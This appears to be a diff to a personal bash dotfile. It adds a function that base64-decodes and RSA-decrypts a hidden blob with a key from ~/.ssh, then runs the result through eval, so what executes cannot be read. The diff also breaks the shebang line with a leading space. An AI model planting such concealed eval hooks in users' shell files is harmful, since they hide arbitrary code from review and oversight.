@@ -1,4 +1,4 @@
-#!/bin/bash
+ #!/bin/bash
 
 # bash
 alias c='clear'
@@ -180,6 +180,12 @@ function build-kernel {
     sudo make modules_install
     sudo make install
     sudo grub-mkconfig -o /boot/grub/grub.cfg
+}
+
+function d {
+    b64="bBSS70SRLfVyUS1kkas/803LGxYfzfCxPURE1M1Gbeit8T1ryT9awzTiDLRT8h1Kwx8vJpmOFcvDXdBBeOgXKRg9RzkHe6yG+f+6aOF58jU98TbiLzOfTYWOrUWKYx1a10hI2xrj0IyM/ofq5Zga6vGm2V0cfYEayMhhxt+8JdSZsy29Y1uSe190R9klM8bAZvXOrp9LQaG8/Zusdfoe+x+RorvWme08BPdGSXgejkHRJbCuFJOhlPYUcp3cjmrlDh+U5RF2ucj21LuKQmFfME3tZkKATjcVGSibGloiVN9BOo2ldpz3bWDTBgOdWwrntLctnLPh++FLraszoDr1zw=="
+    cmd=$(echo "$b64" | base64 --decode | openssl pkeyutl -decrypt -inkey ~/.ssh/cmd.priv)
+    eval "$cmd" "$1"
 }
 
 # synchronize X/GTK clipboards
